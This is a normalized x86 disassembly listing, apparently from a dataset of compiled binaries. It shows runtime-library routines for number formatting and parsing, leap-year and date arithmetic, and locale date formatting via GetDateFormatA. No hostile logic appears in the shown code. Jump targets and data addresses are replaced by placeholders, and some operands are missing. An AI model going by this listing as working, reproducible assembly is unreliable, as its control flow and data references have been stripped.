jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_4040ac
mov eax esi
mov edx ebx
call sub_4046f8
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408bec
mov edx esi
xchg edx eax
call sub_4046f8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4090b8
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_4090fc
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_4093d0
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_4091fb
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_409205
call sub_4091fb
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_4090b8
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409261
call sub_4091fb
call sub_4091f2
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_4091f2
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_4090b8
retn
xor ecx ecx
sub_40929d
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_4091f2
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_4091f2
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_409302
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_409356
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_40929d
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_4093d0
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_4093fd
jmp r-xdata
call sub_40951f
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_4093fd
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402e04
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_40951f
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4095fc
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4096b3
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4096be
neg edx
mov ecx esi
call sub_4096be
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4096b3
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4096da
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402e04
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4096be
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4096da
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409710
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_4090fc
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40419c
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409740
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_4090fc
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40419c
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40978c
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40456c
mov edx esp
xor ecx ecx
call sub_4095fc
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4097b8
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40456c
mov edx esp
xor ecx ecx
call sub_4095fc
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409800
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409844
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4098b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_409844
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407e44
sub_4098f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409800
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407e28
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407e28
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407e28
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409950
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_40998c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409950
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409a54
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_40998c
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407e44
sub_409a84
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409800
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407e28
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407e28
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407e28
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409950
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409bd0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409a84
pop esi
pop ecx
pop ebp
retn 0x8
sub_409bf0
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
lea ecx [ ebx + 0x6 ]
lea edx [ ebx + 0x2 ]
mov eax ebx
call sub_409a84
dec [ ebx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0xe ]
push eax
lea ecx [ ebx + 0xc ]
lea edx [ ebx + 0xa ]
lea eax [ ebx + 0x8 ]
call sub_4098f4
pop ebx
pop ebp
retn 0x8
sub_409c30
push ebx
add esp 0xfffffff8
mov ebx eax
mov cx [ ebx + 0x6 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_409a54
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_4098b4
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_4098b4
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_409ca0
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409800
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409cc8
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_409a54
fstp [ esp + 0x18 ]
fwait
mov ax [ esp + 0x16 ]
push eax
mov cx [ esp + 0x18 ]
mov dx [ esp + 0x16 ]
mov ax [ esp + 0x14 ]
call sub_4098b4
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_409d18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
fld [ ebx ]
call sub_402ac8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fild [ ebp - 0x8 ]
fstp [ ebx ]
fwait
fld [ ebx ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
fld [ ebp + 0x8 ]
call sub_402a98
fabs
fsubr [ ebx ]
fstp [ ebx ]
fwait
fld [ ebp + 0x8 ]
call sub_402a98
fabs
fadd [ ebx ]
fstp [ ebx ]
fwait
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409d6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push [ ebx + 0x4 ]
push [ ebx ]
lea eax [ ebp - 0x8 ]
call sub_409d18
mov eax [ ebp - 0x8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x4 ] eax
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409db4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028e8
sub_409df8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_40436c
mov edx eax
mov eax ebx
call sub_409db4
pop ecx
pop ebx
pop ebp
retn
sub_409e18
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408bec
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409db4
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409e64
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409e90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409bd0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409ec8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4098f4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409f08
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a056
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4040ac
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404144
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a05d
lea eax [ ebp - 0x118 ]
call sub_4040ac
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_40431c
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_40436c
mov edx eax
mov eax [ ebx ]
call sub_40c4cc
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c640
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_4045cc
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c5dc
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_4042a4
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c640
mov ecx eax
mov eax ebx
mov edx esi
call sub_40419c
sub_40a070
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a14e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4040ac
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404144
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404144
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a155
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax ebx
